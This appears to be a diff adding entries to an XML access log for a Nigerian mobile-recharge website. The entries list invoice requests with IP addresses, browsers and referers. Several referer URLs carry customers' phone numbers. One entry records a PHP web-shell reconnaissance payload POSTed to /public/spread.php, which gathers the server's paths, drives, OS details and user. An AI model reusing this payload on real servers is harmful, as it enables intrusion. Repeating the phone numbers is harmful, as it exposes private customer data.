+  <request>/invoice&amp;id=121_145173</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 19:02:51</date>
+  <ip>41.203.73.248</ip>
+  <hostname>41.203.73.248</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_145122</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08033311088&amp;detail2=08033311088</referer>
+ </log>
+ <log>
+  <date>20-12-2019 07:09:59</date>
+  <ip>41.203.73.248</ip>
+  <hostname>41.203.73.248</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_145302</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08026044434&amp;detail2=08026044434</referer>
+ </log>
+ <log>
+  <date>20-12-2019 10:03:06</date>
+  <ip>41.203.73.248</ip>
+  <hostname>41.203.73.248</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_145302</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08026044434&amp;detail2=08026044434</referer>
+ </log>
+ <log>
+  <date>20-12-2019 10:11:04</date>
+  <ip>41.203.73.248</ip>
+  <hostname>41.203.73.248</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_135880</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08033311088&amp;detail2=08033311088</referer>
+ </log>
+ <log>
+  <date>20-12-2019 13:51:00</date>
+  <ip>41.203.73.248</ip>
+  <hostname>41.203.73.248</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_146201</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08090229220&amp;detail2=08090229220</referer>
+ </log>
+ <log>
+  <date>20-12-2019 19:24:10</date>
+  <ip>41.203.73.248</ip>
+  <hostname>41.203.73.248</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_146201</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08090229220&amp;detail2=08090229220</referer>
+ </log>
+ <log>
+  <date>22-12-2019 17:08:04</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_147366</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=07034406743%20D-MFIN-5-10GB&amp;detail2=07034406743</referer>
+ </log>
+ <log>
+  <date>23-12-2019 07:34:37</date>
+  <ip>197.210.227.115</ip>
+  <hostname>197.210.227.115</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36</browser>
+  <request>/invoice&amp;id=293_147391</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/pay/cardpayment.php?flw_ref=FLW199713406&amp;id=147391</referer>
+ </log>
+ <log>
+  <date>23-12-2019 07:59:11</date>
+  <ip>197.211.58.108</ip>
+  <hostname>197.211.58.108</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_147392</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08187689432&amp;detail2=08187689432</referer>
+ </log>
+ <log>
+  <date>23-12-2019 11:10:29</date>
+  <ip>197.211.58.108</ip>
+  <hostname>197.211.58.108</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_147392</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08187689432&amp;detail2=08187689432</referer>
+ </log>
+ <log>
+  <date>23-12-2019 11:11:39</date>
+  <ip>197.211.58.108</ip>
+  <hostname>197.211.58.108</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request></request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08090229220&amp;detail2=08090229220</referer>
+ </log>
+ <log>
+  <date>23-12-2019 12:46:37</date>
+  <ip>129.56.40.98</ip>
+  <hostname>129.56.40.98</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=1_148112</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confir</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:35:34</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=115_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:35:34</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=115_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:35:34</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=115_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:35:34</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=115_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:35:34</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=115_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:35:35</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=115_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:35:35</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=115_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:35:35</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=115_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:35:48</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:43:35</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=329</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:45:30</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=329</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:48:34</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=329</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:48:50</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174131</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=329</referer>
+ </log>
+ <log>
+  <date>28-03-2020 13:52:03</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/78.0.3882.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174131</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>28-03-2020 14:05:48</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=329</referer>
+ </log>
+ <log>
+  <date>28-03-2020 14:06:04</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=329</referer>
+ </log>
+ <log>
+  <date>28-03-2020 14:06:56</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=329</referer>
+ </log>
+ <log>
+  <date>28-03-2020 14:08:52</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=329</referer>
+ </log>
+ <log>
+  <date>28-03-2020 14:11:44</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=329</referer>
+ </log>
+ <log>
+  <date>28-03-2020 14:11:58</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=329_174183</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=329</referer>
+ </log>
+ <log>
+  <date>28-03-2020 15:29:23</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=115_174192</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=187</referer>
+ </log>
+ <log>
+  <date>28-03-2020 15:30:08</date>
+  <ip>41.217.9.42</ip>
+  <hostname>41.217.9.42</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=187_174192</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=187</referer>
+ </log>
+ <log>
+  <date>28-03-2020 19:30:36</date>
+  <ip>105.112.116.115</ip>
+  <hostname>105.112.116.115</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</browser>
+  <request>/invoice&amp;id=0_174211</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/pay/cardpayment.php?flw_ref=URF_1585420192638_1921535&amp;id=174211</referer>
+ </log>
+ <log>
+  <date>28-03-2020 19:51:21</date>
+  <ip>125.67.237.56</ip>
+  <hostname>56.237.67.125.broad.gz.sc.dynamic.163data.com.cn</hostname>
+  <browser>Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)</browser>
+  <request>/public/spread.php     =&gt;$_POST[spread]=@ini_set(&amp;quot;display_errors&amp;quot;, &amp;quot;0&amp;quot;);@set_time_limit(0);function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo &amp;quot;SB360&amp;quot;;echo @asenc($output);echo &amp;quot;SB360&amp;quot;;}ob_start();try{$D=dirname($_SERVER[&amp;quot;SCRIPT_FILENAME&amp;quot;]);if($D==&amp;quot;&amp;quot;)$D=dirname($_SERVER[&amp;quot;PATH_TRANSLATED&amp;quot;]);$R=&amp;quot;{$D}|&amp;quot;;if(substr($D,0,1)!=&amp;quot;/&amp;quot;){foreach(range(&amp;quot;C&amp;quot;,&amp;quot;Z&amp;quot;)as $L)if(is_dir(&amp;quot;{$L}:&amp;quot;))$R.=&amp;quot;{$L}:&amp;quot;;}else{$R.=&amp;quot;/&amp;quot;;}$R.=&amp;quot;	&amp;quot;;$u=(function_exists(&amp;quot;posix_getegid&amp;quot;))?@posix_getpwuid(@posix_geteuid()):&amp;quot;&amp;quot;;$s=($u)?$u[&amp;quot;name&amp;quot;]:@get_current_user();$R.=php_uname();$R.=&amp;quot;|{$s}&amp;quot;;echo $R;;}catch(Exception $e){echo &amp;quot;ERROR://&amp;quot;.$e-&amp;gt;getMessage();};asoutput();die();, </request>
+  <score>2</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>29-03-2020 00:11:00</date>
+  <ip>54.36.148.218</ip>
+  <hostname>ip-54-36-148-218.a.ahrefs.com</hostname>
+  <browser>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)</browser>
+  <request>/details/SUPER-ANTICOR-NANO-PROTECH-LONG-LIOFE-PROTECTION-FROM-CORROSSION-210ML.html</request>
+  <score>1</score>
+  <referer>Unknown</referer>
+ </log>
+</logs>
